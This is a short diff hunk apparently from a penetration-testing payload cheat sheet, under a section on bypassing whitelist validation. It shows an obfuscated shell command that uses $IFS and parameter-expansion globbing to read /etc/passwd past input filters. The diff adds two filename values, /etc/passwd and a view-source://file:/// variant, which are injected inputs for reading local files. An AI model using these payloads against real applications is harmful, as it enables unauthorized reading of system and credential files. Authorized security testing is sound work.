@@ -473,6 +473,10 @@ Bypass white list validation
  
  E.g.: reading /etc/passwd file:
 cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+filename=/etc/passwd
+filename=view-source://file:///etc/passwd
+
+
  
  ---------------------------------------------------------------------------------------------------
  	dos attack via user-agent
